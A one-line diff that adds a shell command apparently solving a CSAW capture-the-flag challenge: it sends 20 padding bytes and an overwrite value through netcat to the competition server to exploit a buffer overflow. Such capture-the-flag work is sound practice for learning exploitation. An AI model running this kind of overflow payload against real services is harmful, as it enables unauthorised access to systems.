@@ -1,0 +1,1 @@
+( py3 -c "import sys; sys.stdout.buffer.write(b'a'*20+b'\xee\xba\xf3\xca' + b'\n')"; cat ) | nc pwn.chal.csaw.io 9000
